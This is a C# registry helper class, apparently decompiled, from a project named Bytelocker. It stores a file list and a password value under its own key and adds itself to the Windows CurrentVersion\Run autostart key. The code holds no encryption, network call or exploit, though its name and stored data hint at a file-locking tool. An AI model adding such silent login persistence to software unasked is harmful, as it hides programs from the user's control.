using System;
using System.Collections.Generic;
using Microsoft.Win32;

namespace Bytelocker.Settings;

internal class RegistryManager
{
	public static string FILES_KEY_NAME = "Files";

	public static string SETTINGS_KEY_NAME = "Config";

	public static string PWD_VALUE_NAME = "id";

	private readonly string SOFTWARE_NAME = "Software\\ByteLocker";

	public List<string> ReadAllValues(string subKey)
	{
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(SOFTWARE_NAME + "\\" + subKey);
		try
		{
			List<string> list = new List<string>(registryKey.GetValueNames());
			if (list.Count == 0)
			{
				return new List<string> { "null" };
			}
			return list;
		}
		catch (NullReferenceException)
		{
			return new List<string> { "null" };
		}
	}

	public void CreateMainKey()
	{
		Registry.CurrentUser.CreateSubKey(SOFTWARE_NAME);
	}

	public void CreateSubKey(string name)
	{
		Registry.CurrentUser.CreateSubKey(SOFTWARE_NAME + "\\" + name);
	}

	public void DeleteSubKey(string name)
	{
		Registry.CurrentUser.DeleteSubKey(SOFTWARE_NAME + "\\" + name);
	}

	public void DeleteMainKey()
	{
		Registry.CurrentUser.DeleteSubKeyTree(SOFTWARE_NAME);
	}

	public void CreateBoolValue(string subKey, string valueName, bool value)
	{
		RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(SOFTWARE_NAME + "\\" + subKey);
		registryKey.SetValue(valueName, value ? 1 : 0);
	}

	public void DeleteValue(string subKey, string valueName)
	{
		RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(SOFTWARE_NAME + "\\" + subKey);
		registryKey.DeleteValue(valueName);
	}

	public void CreateStringValue(string subKey, string valueName, string value)
	{
		RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(SOFTWARE_NAME + "\\" + subKey);
		registryKey.SetValue(valueName, value);
	}

	public void AddItemToStartup(string valueName, string filepath, string args)
	{
		RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
		if (args == "")
		{
			registryKey.SetValue(valueName, "\"" + filepath + "\"");
		}
		else
		{
			registryKey.SetValue(valueName, "\"" + filepath + "\" " + args);
		}
	}

	public string getStartupPath(string valuename)
	{
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
		try
		{
			return registryKey.GetValue(valuename)!.ToString();
		}
		catch (Exception)
		{
			return "none";
		}
	}

	public void RemoveFromStartup(string valueName)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
			registryKey.DeleteValue(valueName);
		}
		catch (Exception)
		{
		}
	}

	public string ReadStringValue(string subKey, string valueName)
	{
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(SOFTWARE_NAME + "\\" + subKey);
		try
		{
			return registryKey.GetValue(valueName)!.ToString();
		}
		catch (Exception)
		{
			return "none";
		}
	}

	public bool ReadBoolValue(string subKey, string valueName)
	{
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(SOFTWARE_NAME + "\\" + subKey);
		try
		{
			return (int)registryKey.GetValue(valueName) == 1;
		}
		catch (NullReferenceException)
		{
			return false;
		}
	}
}
